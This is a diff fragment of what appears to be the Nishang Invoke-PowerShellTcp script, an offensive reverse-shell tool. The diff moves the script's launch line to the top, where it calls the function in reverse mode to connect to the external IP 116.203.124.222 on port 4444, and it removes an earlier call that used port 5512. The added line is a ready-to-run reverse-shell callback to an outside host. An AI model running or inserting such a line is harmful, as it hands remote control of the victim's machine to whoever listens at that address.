@@ -1,3 +1,5 @@
+Invoke-PowerShellTcp -Reverse -IpAddress 116.203.124.222 -Port 4444
+
 function Invoke-PowerShellTcp 
 { 
 <#
@@ -124,5 +126,3 @@ https://github.com/samratashok/nishang
         Write-Error $_
     }
 }
-
-Invoke-PowerShellTcp -Reverse -IpAddress 116.203.124.222 -Port 5512
